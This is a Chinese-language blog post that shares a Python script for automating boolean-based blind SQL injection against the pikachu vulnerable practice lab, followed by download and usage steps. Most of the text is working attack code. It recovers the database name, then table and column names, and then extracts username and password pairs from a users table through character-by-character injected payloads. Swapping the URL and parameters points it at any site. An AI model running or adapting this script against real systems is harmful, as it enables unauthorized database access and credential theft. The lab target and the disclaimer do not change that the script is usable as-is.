***严正声明：本文仅限于技术讨论与分享，严禁用于非法途径。**

## 一、python代码

以下代码可自用，未经允许不可转载

下面的代码是基于pikachu的漏洞平台SQL-Inject的布尔盲注关卡开发的，主要目的是缩短手工盲注的时间，可以实现当前数据库名称，表名称，列名称，数据库内容的爆破。

使用前需要根据实际情况修改payload和部分参数（见注释）

    
    
    #!/usr/bin/python3
    # coding=utf-8
     
    """
    functions for boolean-based sql injection(blind)
    :copyright: Copyright (c) 2021, Fancy Xiang. All rights reserved.
    :license: GNU General Public License v3.0, see LICENSE for more details.
    """
     
    import requests
     
    url = "http://192.168.101.16/pikachu/vul/sqli/sqli_blind_b.php"               #有可利用漏洞的url，根据实际情况填写
    headers={ "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36","Cookie": "PHPSESSID=7qgjcq21lsq834acodn0mo7km3",}    #http request报文头部，根据实际情况填写
     
    keylist = [chr(i) for i in range(33, 127)]                                     #包括数字、大小写字母、可见特殊字符
    flag = 'your uid'                                                              #用于判断附加sql语句为真的字符，根据网页回显填写
     
    def CurrentDatabaseBool():
        n = 10                                                                      #预测当前数据库名称最大可能的长度，根据实际情况填写
        k = 0
        j = n//2 
        length = 0
        db = str()
        while True:
            if j>k and j<n and j-k>3:
                payload1 = "lili' and length(database())>"+str(j)+"-- ss"           #所有payload根据实际情况填写
                param = {
                "name":payload1,
                "submit":"查询",
                }
                response = requests.get(url, params = param, headers = headers)     #本脚本根据GET型注入编写，遇到POST型可修改改行方法和参数，其他所有函数中同样
                if response.text.find(flag) != -1:
                    n=n
                    k=j
                else:
                    k=k
                    n=j
                j=(n-k)//2
            elif j-k==3 or j-k<3:
                for i in range(k-1,n+2):
                    payload2 = "lili' and length(database())="+str(i)+"-- ss"
                    param = {
                    "name":payload2,
                    "submit":"查询",
                    }
                    response = requests.get(url, params = param, headers = headers)
                    if response.text.find(flag) != -1:
                        length = i
                        break
                break
            else:
                break
        print("the name of current database contains "+str(length)+" characters")
        
        for i in range(1,length+1):
            for c in keylist:
                payload3 = "lili' and substring(database(),"+str(i)+",1)='"+c+"'-- ss"
                param = {
                "name":payload3,
                "submit":"查询",
                }
                response = requests.get(url, params = param, headers = headers)
                if response.text.find(flag) != -1:
                    db = db+c
                    break
        print("the name of current database is "+str(db))
        
    def TablesBool():
        n = 100                                                                     #预测当前数据库中所有表名称最大可能的长度，根据实际情况填写
        k = 0
        j = n//2
        length = 0
        tname = str()
        while True:
            if j>k and j<n and j-k>3:
                payload4 = "lili' and (length((select group_concat(table_name) from information_schema.tables where table_schema = database())))>"+str(j)+"-- ss"
                param = {
                "name":payload4,
                "submit":"查询",
                }
                response = requests.get(url, params = param, headers = headers)
                if response.text.find(flag) != -1:
                    n=n
                    k=j
                else:
                    k=k
                    n=j
                j=(n-k)//2
            elif j-k==3 or j-k<3:
                for i in range(k-1,n+2):
                    payload5 = "lili' and (length((select group_concat(table_name) from information_schema.tables where table_schema = database())))="+str(i)+"-- ss"
                    param = {
                    "name":payload5,
                    "submit":"查询",
                    }
                    response = requests.get(url, params = param, headers = headers)
                    if response.text.find(flag) != -1:
                        length = i
                        break
                break
            else:
                break
        print("the name of all tables in current database contains "+str(length)+" characters")
        
        for i in range(1,length+1):
            for c in keylist:
                payload6 = "lili' and substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),"+str(i)+",1)='"+c+"'-- ss"
                param = {
                "name":payload6,
                "submit":"查询",
                }
                response = requests.get(url, params = param, headers = headers)
                if response.text.find(flag) != -1:
                    tname = tname+c
                    break
        print("the name of all tables in current database is "+str(tname))
     
     
    def ColumnsBool():
        n = 200                                                                     #预测某个表所有列名称最大可能的长度，根据实际情况填写
        k = 0
        j = n//2
        length = 0
        cname = str()
        while True:
            if j>k and j<n and j-k>3:
                payload7 = "lili' and (length((select group_concat(column_name) from information_schema.columns where table_name = 'users')))>"+str(j)+"-- ss"
                param = {
                "name":payload7,
                "submit":"查询",
                }
                response = requests.get(url, params = param, headers = headers)
                if response.text.find(flag) != -1:
                    n=n
                    k=j
                else:
                    k=k
                    n=j
                j=(n-k)//2
            elif j-k==3 or j-k<3:
                for i in range(k-1,n+2):
                    payload8 = "lili' and (length((select group_concat(column_name) from information_schema.columns where table_name = 'users')))="+str(i)+"-- ss"
                    param = {
                    "name":payload8,
                    "submit":"查询",
                    }
                    response = requests.get(url, params = param, headers = headers)
                    if response.text.find(flag) != -1:
                        length = i
                        break
                break
            else:
                break
        print("the name of all columns in current table contains "+str(length)+" characters")
        
        for i in range(1,length+1):
            for c in keylist:
                payload9 = "lili' and substr((select group_concat(column_name) from information_schema.columns where table_name = 'users'),"+str(i)+",1)='"+c+"'-- ss"
                param = {
                "name":payload9,
                "submit":"查询",
                }
                response = requests.get(url, params = param, headers = headers)
                if response.text.find(flag) != -1:
                    cname = cname+c
                    break
        print("the name of all columns in current table is "+str(cname))
     
    def ContentBool():
        n = 200                                                                     #预测期望获取的数据的最大可能的长度，根据实际情况填写
        k = 0
        j = n//2
        length = 0
        content = str()
        while True:
            if j>k and j<n and j-k>3:
                payload10 = "lili' and (length((select group_concat(concat(username,'^',password)) from users)))>"+str(j)+"-- ss"
                param = {
                "name":payload10,
                "submit":"查询",
                }
                response = requests.get(url, params = param, headers = headers)
                if response.text.find(flag) != -1:
                    n=n
                    k=j
                else:
                    k=k
                    n=j
                j=(n-k)//2
            elif j-k==3 or j-k<3:
                for i in range(k-1,n+2):
                    payload11 = "lili' and (length((select group_concat(concat(username,'^',password)) from users)))="+str(i)+"-- ss"
                    param = {
                    "name":payload11,
                    "submit":"查询",
                    }
                    response = requests.get(url, params = param, headers = headers)
                    if response.text.find(flag) != -1:
                        length = i
                        break
                break
            else:
                break
        print("the content contains "+str(length)+" characters")
        
        for i in range(1,length+1):
            for c in keylist:
                payload12 = "lili' and substr((select group_concat(concat(username,'^',password)) from users),"+str(i)+",1)='"+c+"'-- ss"
                param = {
                "name":payload12,
                "submit":"查询",
                }
                response = requests.get(url, params = param, headers = headers)
                if response.text.find(flag) != -1:
                    content = content+c
                    break
        print("the content is "+str(content))

## 二、使用方法

### 1、下载

（1）比较简单的方法  
从我的github打包下载源代码：

仓库地址：[JacquelinXiang/sqli_blind: A simple tool/framework for boolean-based or
time-based sql injection(blind)
(github.com)](https://github.com/JacquelinXiang/sqli_blind)

下载链接：<https://github.com/JacquelinXiang/sqli_blind/archive/refs/heads/main.zip>

建议不要直接点击，会很慢，还可能连不上。可以把下载链接丢到github下载加速器里面去下载。

下载下来的文件夹改名为 sqli_blind

（2）比较复杂的方法  
a、复制粘贴上面的代码保存为sqli_bb.py

b、复制粘贴下面的代码，保存为__init__.py

    
    
    from .sqli_bb import *

### 2、使用

（1）确保有python3环境，没有的话需要安装

（2）根据实际情况修改代码中的payload和部分参数（见备注）

（3）打开命令行，进入sql_blind文件夹的上级目录，输入python进入python3的交互界面

（4）输入 from sqli_blind import * 导入所有函数，然后调用函数即可，具体见测试部分

注意：每次修改代码需要退出python3交互界面，删除sqli_blind下的__pycache__文件夹，并重新进入python3交互界面from
sqli_blind import *

## 三、测试

![1620648783_6099234fea8b7163f9109.png!small?1620648784310](https://image.3001.net/images/20210510/1620648783_6099234fea8b7163f9109.png!small?1620648784310)

